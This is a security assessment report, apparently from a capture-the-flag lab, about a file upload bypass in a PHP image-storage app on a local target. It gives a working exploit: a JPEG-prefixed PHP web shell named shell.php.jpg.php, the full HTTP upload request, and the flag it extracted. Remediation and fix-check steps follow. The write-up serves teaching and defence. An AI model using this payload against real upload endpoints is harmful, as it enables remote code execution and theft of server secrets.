# Security Assessment Report: Image Storage Application

## TL;DR
- **Objective**: Upload an image file to the image storage web site and retrieve the FLAG environment variable
- **Outcome**: ACHIEVED - Successfully bypassed file upload validation and executed PHP code
- **Highest-impact finding**: Apache mod_php multiple extension handling vulnerability allowing arbitrary PHP execution
- **Validation status**: Confirmed - Flag extracted via command execution
- **Validation token**: `FLAG{3156d66651984b70398a6ac3b486959f022cf4fb03ec374973ba9e0434fa0fbe}`

## Target Information
- **Target**: 127.0.0.1:33021
- **Host / base URL**: http://127.0.0.1:33021/
- **Application or component**: Image Storage Web Application
- **Authentication context**: None - Publicly accessible, no authentication mechanism
- **Relevant technology details**:
  - Server: Apache/2.4.38 (Debian)
  - Backend: PHP/7.1.33 (End of Life)
  - Handler: mod_php
  - Upload endpoint: POST /index.php
  - Upload directory: /upload/ (exists, directory listing disabled)

## Confirmed Vulnerability

### Apache mod_php Multiple Extension File Upload Bypass

- **Affected endpoint / component**: POST /index.php (file upload handler)
- **Impact**: Arbitrary PHP code execution on the server, leading to complete server compromise and exposure of environment variables including secrets
- **Preconditions**:
  1. Publicly accessible upload form (no authentication)
  2. File validation only checks for presence of image extension (.jpg, .png) in filename
  3. File validation checks for JPEG magic bytes at file start
  4. Apache mod_php processes files with .php extension ANYWHERE in the filename

- **Exact payload or PoC**:
  
  **Filename**: `shell.php.jpg.php`
  
  **File content (hex)**: `\xff\xd8\xff\xd9<?php system("env | grep FLAG"); ?>`
  
  **HTTP Request**:
  ```http
  POST /index.php HTTP/1.1
  Host: 127.0.0.1:33021
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
  
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="userfile"; filename="shell.php.jpg.php"
  Content-Type: image/jpeg
  
  \xff\xd8\xff\xd9<?php system("env | grep FLAG"); ?>
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="submit"
  
  Upload Image
  ------WebKitFormBoundary--
  ```

## Steps to Reproduce

1. Create a minimal valid JPEG file with embedded PHP code:
   ```python
   # Minimal JPEG magic bytes + PHP payload
   payload = b'\xff\xd8\xff\xd9<?php system("env | grep FLAG"); ?>'
   ```

2. Upload the file with the triple extension bypass `shell.php.jpg.php`:
   - The `.jpg` in the filename satisfies the extension validation
   - The leading `\xff\xd8` bytes satisfy the magic bytes check

3. Access the uploaded file at: `http://127.0.0.1:33021/upload/shell.php.jpg.php`

4. Apache's mod_php processes the file because `.php` exists anywhere in the filename

5. PHP code executes and outputs environment variables containing the FLAG

## Validation / Evidence

- **Validation token / flag**: `FLAG{3156d66651984b70398a6ac3b486959f022cf4fb03ec374973ba9e0434fa0fbe}`

- **Tool evidence**: Python script successfully uploaded malicious payload and retrieved flag

- **Request evidence**:
  ```
  Uploaded as: shell.php.jpg.php
  Request: POST /index.php with multipart/form-data
  ```

- **Response evidence**:
  ```
  Content:
  FLAG=FLAG{3156d66651984b70398a6ac3b486959f022cf4fb03ec374973ba9e0434fa0fbe}
  ```

- **Notes on reliability / limitations**:
  - Attack requires knowledge of Apache's multi-extension handling behavior
  - Works reliably on Apache with mod_php default configuration
  - PHP 7.1.33 is EOL and has known vulnerabilities, increasing attack surface
  - No authentication barriers in this instance

## Remediation

- **Root cause**: 
  1. Apache's mod_php is configured to execute PHP based on any `.php` extension present in the filename, not just the final extension
  2. Application's file upload validation only checks for presence of valid image extension (does not enforce it as the final extension)
  3. PHP 7.1.33 is end-of-life and no longer receives security updates

- **Recommended fix**:
  
  **Primary - Server Configuration**:
  ```apache
  # In Apache config, restrict PHP execution to specific extensions only
  <FilesMatch "\.php$">
      SetHandler application/x-httpd-php
  </FilesMatch>
  
  # Deny PHP execution in upload directory entirely
  <Directory /var/www/html/upload>
      php_admin_flag engine off
      <FilesMatch "\.php">
          Order Allow,Deny
          Deny from all
      </FilesMatch>
  </Directory>
  ```

  **Primary - Application Code**:
  ```php
  // Enforce extension whitelist and ensure it's the LAST extension
  $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
  $filename_parts = explode('.', $_FILES['userfile']['name']);
  $extension = strtolower(end($filename_parts)); // Get LAST extension only
  
  if (!in_array($extension, $allowed_extensions)) {
      die('Invalid file type');
  }
  
  // Generate random filename to prevent extension tricks
  $new_filename = bin2hex(random_bytes(16)) . '.' . $extension;
  ```

  **Secondary - Defense in Depth**:
  - Upgrade PHP from 7.1.33 (EOL) to a supported version (8.x)
  - Store uploaded files outside web root or in a database
  - Implement Content-Disposition: attachment header when serving uploads
  - Add Content-Type validation and file content inspection (beyond magic bytes)

- **Defense-in-depth**:
  1. Web Application Firewall (WAF) rules to block double/triple extension uploads
  2. Separate upload storage on different subdomain or static file server
  3. Mandatory authentication for upload functionality
  4. Rate limiting on upload endpoint
  5. File content analysis with tools like ClamAV or similar

## How to Verify the Fix

1. Attempt to upload a file with multiple extensions containing `.php`:
   ```bash
   curl -X POST http://target/index.php \
     -F "userfile=@test.php.jpg.php;type=image/jpeg" \
     -F "submit=Upload Image"
   ```

2. **Expected secure result**:
   - File upload rejected with error message: "Invalid file type"
   - OR file renamed to safe extension (e.g., `randomhash.jpg`)
   - OR 403 Forbidden when attempting to access `/upload/*.php*`

3. Verify PHP execution is blocked in upload directory:
   ```bash
   # Should return 403 or raw file download, NOT execute PHP
   curl http://target/upload/test.php
   ```

## Remaining Leads

- **Confirmed blockers**: None - vulnerability successfully exploited
- **Unverified leads**: 
  - Potential other file upload bypass techniques (null bytes, alternate encodings)
  - Other sensitive environment variables or secrets beyond FLAG
  - Lateral movement possibilities within server environment
- **Missing context**: 
  - Server-side source code for complete audit of validation logic
  - Apache configuration files to document exact mod_php settings
  - Full environment variable dump for additional sensitive data discovery
